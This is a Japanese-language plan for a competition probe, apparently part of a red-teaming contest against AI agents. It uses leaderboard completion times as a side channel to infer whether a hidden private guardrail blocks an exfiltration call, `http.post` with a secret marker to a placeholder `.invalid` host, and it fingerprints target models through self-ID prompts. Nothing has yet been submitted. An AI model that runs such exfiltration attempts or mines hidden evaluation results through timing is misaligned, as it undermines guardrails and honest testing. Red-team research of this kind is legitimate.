# prob001 private-LB timing probe

## 目的

`http.post(url=clean, data=SECRET_MARKER)` が private guardrail で hard block されるかを、LB 完了時間の差から推定する。
public/private の trace は直接見えないため、結果は `ALLOW示唆`、`BLOCK示唆`、`判別不能` のどれかだけにする。

## 提出セット

3 枠の最小セットで実施する。

| kernel | 役割 | 候補数 | GPT/Gemma | gate |
|---|---:|---:|---|---|
| `prob001_fwd` | forward | 30 | GPT のみ。Gemma は `[]` | `http.post(url=http://pNNNN.invalid, data=SECRET_MARKER)` |
| `prob001_rev` | reverse | 30 | GPT のみ。Gemma は `[]` | 同上 |
| `prob001_clock_mid` | midpoint clock | 30 | GPT のみ。Gemma は `[]` | なし |

共通設定:

- 各 candidate は 8 user messages。
- `FWD/REV`: message 1 が exact EXFIL gate。message 2-8 が gate result を読む条件分岐 tail。
- `CLOCK-MID`: gate なし。15 candidates は常時 LONG、15 candidates は常時 STOP。
- LONG は tool-free の 120 words 応答を 7 回、STOP は `STOP` のみ。
- モデル判別は self-ID 3 prompt x 2 回。全 6 vote が GPT の場合だけ候補を返す。Gemma/unknown/ambiguous は `[]`。

候補数は当初 500/50 も検討したが、Kaggle smoke で N=20 でも LONG 側 replay が重いことを確認したため、
本番 probe は N=30 に固定する。2.5h 上限や timeout に到達した提出は、条件分岐 timing ではなく打ち切り時間を
測ってしまうため `判別不能` として扱う。

## 分岐仕様

### FWD

public は `url` が clean なので gate が ALLOW される想定。

| public gate | private gate | public tail | private tail | 期待時間 |
|---|---|---|---|---|
| ALLOW | ALLOW | LONG | LONG | `2L` |
| ALLOW | DENY/CONFIRM/error | LONG | STOP | `L` |

### REV

FWD と同じ gate だが tail 極性だけ反転する。

| public gate | private gate | public tail | private tail | 期待時間 |
|---|---|---|---|---|
| ALLOW | ALLOW | STOP | STOP | `0` |
| ALLOW | DENY/CONFIRM/error | STOP | LONG | `L` |

### CLOCK-MID

private 判定に依存しない midpoint。

| public | private | 期待時間 |
|---|---|---|
| 15 LONG + 15 STOP | 15 LONG + 15 STOP | `L` |

ここで `L` は「30 candidates が片側 replay で LONG になる」程度の追加時間。

## 事前固定の判定ルール

`T_FWD`、`T_REV`、`T_CLOCK` は LB submit から COMPLETE 検知までの分数。キューと polling を含む。

### public/private 判定ごとの期待挙動

public 側の gate は既知対照として `ALLOW` を期待する。もし public 側が `ALLOW` でなければ、この probe は成立しない。

| case | public gate | private gate | FWD の挙動 | REV の挙動 | CLOCK-MID の挙動 | 期待される時間順 | 判定 |
|---|---|---|---|---|---|---|---|
| A | ALLOW | ALLOW | public LONG + private LONG = `2L` | public STOP + private STOP = `0` | public half LONG + private half LONG = `L` | `T_REV < T_CLOCK < T_FWD` | `ALLOW示唆` |
| B | ALLOW | DENY | public LONG + private STOP = `L` | public STOP + private LONG = `L` | `L` | `T_FWD ≈ T_REV ≈ T_CLOCK` | `BLOCK示唆` |
| C | ALLOW | CONFIRM | public LONG + private STOP = `L` | public STOP + private LONG = `L` | `L` | `T_FWD ≈ T_REV ≈ T_CLOCK` | `BLOCK示唆` |
| D | ALLOW | tool error | public LONG + private STOP = `L` | public STOP + private LONG = `L` | `L` | `T_FWD ≈ T_REV ≈ T_CLOCK` | `BLOCK示唆` |
| E | ALLOW | SANITIZE + success | public LONG + private LONG = `2L` | public STOP + private STOP = `0` | `L` | `T_REV < T_CLOCK < T_FWD` | `ALLOW示唆` だが score は未確定 |
| F | DENY/CONFIRM/error | any | public 対照が壊れる | public 対照が壊れる | `L` | 任意 | `判別不能` |

case E は重要。branch は「tool call が成功扱いか」を読んでいるため、private が payload を sanitize しつつ成功 tool result を返すなら `ALLOW` と同じ時間順になる。ただし、この場合は private score に `SECRET_MARKER` が残る保証はない。従って `ALLOW示唆` は「hard block なし」の意味に限定する。

### 観測からの分類

| 観測パターン | 判定 | 解釈 |
|---|---|---|
| `T_REV < T_CLOCK < T_FWD` かつ両差が十分大きい | `ALLOW示唆` | private でも exact gate が hard block されず、FWD だけ private LONG が乗った可能性が高い |
| `T_FWD ≈ T_REV ≈ T_CLOCK` | `BLOCK示唆` | private で exact gate が DENY/CONFIRM/error になり、FWD と REV がどちらも `L` 付近に来た可能性が高い |
| `T_FWD` と `T_REV` がどちらも `T_CLOCK` を大きく上回る | `判別不能` | 条件分岐が両極性で LONG になった、または queue/runtime の交絡 |
| `T_CLOCK` が最速/最遅に大きく外れる | `判別不能` | midpoint が時計として読めていない |
| いずれかが VOID/ERROR、または public score が想定と違う | `判別不能` | runtime/probe 自体が壊れている |

十分大きい差の目安は `30-60分以上`、または polling interval の 2 倍以上。3 枠案では duplicate がないため、単発の強い差だけを「示唆」として扱う。

### 数値例

仮に `L = 80分`、queue/polling 差が小さい場合:

| private gate | `T_REV` | `T_CLOCK` | `T_FWD` | 読み |
|---|---:|---:|---:|---|
| ALLOW | 600分 | 680分 | 760分 | `ALLOW示唆` |
| DENY/CONFIRM/error | 680分 | 675分 | 690分 | `BLOCK示唆` |
| 不安定/交絡 | 760分 | 680分 | 770分 | `判別不能` |

## 注意

- `ALLOW示唆` は「private が hard block しない」ことの示唆であり、SANITIZE されて scoring されるかまでは保証しない。
- `BLOCK示唆` は exact gate の hard block 示唆であり、別 sink、別 payload、deputy 経路まで否定しない。
- 2 枠 `FWD/REV` だけでは scale anchor がないため採用しない。

## 観測欄

| kernel | submitted_at_utc | daily slot | public | lb_time | status | notes |
|---|---|---:|---:|---:|---|---|
| `prob001_fwd` | - | - | - | - | not submitted | - |
| `prob001_rev` | - | - | - | - | not submitted | - |
| `prob001_clock_mid` | - | - | - | - | not submitted | - |

## 結論

未提出。
